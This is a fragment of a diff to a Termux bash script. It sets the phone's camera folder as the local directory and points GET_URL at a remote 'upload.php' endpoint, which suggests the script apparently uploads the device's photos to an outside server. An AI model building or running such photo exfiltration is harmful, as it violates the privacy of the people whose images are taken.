@@ -1,6 +1,6 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
-GET_URL="https://faizal.great-site.net/index.php"
+GET_URL="https://gallery-eye.lovestoblog.com/upload.php"
 LOCAL_DIR="$HOME/storage/dcim/Camera"
 
 clear
